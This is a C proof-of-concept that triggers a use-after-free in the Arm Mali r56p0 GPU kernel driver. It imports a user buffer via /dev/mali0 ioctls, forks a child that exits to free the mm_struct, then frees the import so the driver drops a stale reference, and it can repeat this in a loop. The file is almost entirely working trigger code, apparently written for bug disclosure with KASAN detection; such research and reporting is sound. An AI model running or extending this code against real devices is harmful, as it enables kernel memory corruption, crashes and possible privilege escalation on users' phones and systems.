/**
 * PoC for Mali r56p0 User Buffer Import UAF (CWE-416)
 * 
 * Bug: user_buf->mm = current->mm without mmgrab() in kbase_mem_from_user_buffer()
 * Free paths call mmdrop() on never-grabbed reference
 * 
 * Trigger:
 * 1. Open /dev/mali0
 * 2. Import user buffer (BASE_MEM_IMPORT_USER_BUFFER)
 * 3. Fork child
 * 4. Child exits (frees mm_struct)
 * 5. Parent closes fd / unmaps → user buffer freed → mmdrop() on freed mm_struct
 * 
 * Requires KASAN to detect: CONFIG_KASAN=y
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <signal.h>
#include <linux/mman.h>
#include <errno.h>
#include <stdint.h>

/* Mali Kbase IOCTL definitions (from uapi/gpu/arm/midgard/mali_kbase_ioctl.h) */
#define KBASE_IOCTL_VERSION_CHECK    _IOWR('k', 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS        _IOW('k', 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_IMPORT       _IOWR('k', 4, struct kbase_ioctl_mem_import)
#define KBASE_IOCTL_MEM_FREE         _IOW('k', 5, struct kbase_ioctl_mem_free)

#define BASE_MEM_IMPORT_USER_BUFFER  0x00000008
#define BASE_MEM_PROT_CPU_RD         0x00000001
#define BASE_MEM_PROT_CPU_WR         0x00000002
#define BASE_MEM_PROT_GPU_RD         0x00000004
#define BASE_MEM_PROT_GPU_WR         0x00000008
#define BASE_MEM_CACHED_CPU          0x00000100
#define BASE_MEM_COHERENT_SYSTEM     0x00000400
#define BASE_MEM_GROW_ON_GPF         0x00002000
#define BASE_MEM_FLAGS_INPUT_MASK    0x000FFFFF

struct kbase_ioctl_version_check {
    __u16 major;
    __u16 minor;
};

struct kbase_ioctl_set_flags {
    __u64 flags;
};

struct base_mem_import_user_buffer {
    __u64 ptr;
    __u64 length;
};

struct kbase_ioctl_mem_import {
    __u32 type;
    union {
        __s32 fd;
        struct base_mem_import_user_buffer user_buffer;
    } handle;
    __u64 va_pages;
    __u64 flags;
    __u64 gpu_va;
};

struct kbase_ioctl_mem_free {
    __u64 gpu_va;
};

static int mali_fd = -1;
static void *user_buffer = NULL;
static size_t user_buffer_size = 0x10000; /* 64KB */

void cleanup_parent(void) {
    if (mali_fd >= 0) {
        close(mali_fd);
        mali_fd = -1;
    }
    if (user_buffer) {
        munmap(user_buffer, user_buffer_size);
        user_buffer = NULL;
    }
}

int main(int argc, char **argv) {
    struct kbase_ioctl_version_check vc = { .major = 1, .minor = 0 };
    struct kbase_ioctl_set_flags sf = { .flags = 0 };
    struct kbase_ioctl_mem_import mi = {0};
    struct kbase_ioctl_mem_free mf = {0};
    struct base_mem_import_user_buffer ub = {0};
    pid_t child = -1;
    int ret;
    int iterations = argc > 1 ? atoi(argv[1]) : 1;

    printf("[+] Mali r56p0 User Buffer UAF PoC (iterations: %d)\n", iterations);
    printf("[+] PID: %d\n", getpid());

    /* Allocate user buffer */
    user_buffer = mmap(NULL, user_buffer_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_buffer == MAP_FAILED) {
        perror("mmap user buffer");
        return 1;
    }
    memset(user_buffer, 0xAA, user_buffer_size);
    printf("[+] User buffer at %p (size 0x%zx)\n", user_buffer, user_buffer_size);

    /* Open Mali device */
    mali_fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (mali_fd < 0) {
        perror("open /dev/mali0");
        cleanup_parent();
        return 1;
    }
    printf("[+] Opened /dev/mali0 (fd=%d)\n", mali_fd);

    /* Version check */
    ret = ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc);
    if (ret < 0) {
        perror("VERSION_CHECK");
        cleanup_parent();
        return 1;
    }
    printf("[+] Version: %d.%d\n", vc.major, vc.minor);

    /* Set flags */
    ret = ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &sf);
    if (ret < 0) {
        perror("SET_FLAGS");
        cleanup_parent();
        return 1;
    }

    for (int iter = 0; iter < iterations; iter++) {
        printf("\n[+] === Iteration %d/%d ===\n", iter + 1, iterations);

        /* Import user buffer */
        ub.ptr = (uintptr_t)user_buffer;
        ub.length = user_buffer_size;
        mi.type = BASE_MEM_IMPORT_USER_BUFFER;
        mi.handle.user_buffer = ub;
        mi.va_pages = (user_buffer_size + 4095) / 4096;
        mi.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                   BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                   BASE_MEM_CACHED_CPU | BASE_MEM_COHERENT_SYSTEM;

        printf("[+] Importing user buffer (va_pages=%llu, flags=0x%llx)\n",
               mi.va_pages, mi.flags);

        ret = ioctl(mali_fd, KBASE_IOCTL_MEM_IMPORT, &mi);
        if (ret < 0) {
            perror("MEM_IMPORT (user buffer)");
            continue;
        }
        printf("[+] Imported at GPU VA: 0x%llx\n", mi.gpu_va);

        /* Fork - child will exit and free mm_struct */
        child = fork();
        if (child == 0) {
            /* Child process */
            printf("[CHILD %d] Sleeping 1s then exiting to free mm_struct\n", getpid());
            sleep(1);
            printf("[CHILD %d] Exiting...\n", getpid());
            exit(0);
        }

        if (child < 0) {
            perror("fork");
            continue;
        }

        /* Parent: wait a bit for child to exit, then free the import */
        sleep(2);
        
        printf("[PARENT %d] Child %d should have exited, freeing import\n", getpid(), child);
        waitpid(child, NULL, 0);
        child = -1;

        /* Free the user buffer import - this should trigger the UAF */
        mf.gpu_va = mi.gpu_va;
        printf("[PARENT] Freeing GPU VA 0x%llx (triggers mmdrop on freed mm_struct)\n", mi.gpu_va);
        ret = ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mf);
        if (ret < 0) {
            perror("MEM_FREE");
        } else {
            printf("[PARENT] Freed successfully\n");
        }

        /* Small delay between iterations */
        usleep(100000);
    }

    printf("\n[+] Done. Check dmesg for KASAN UAF report.\n");
    cleanup_parent();
    return 0;
}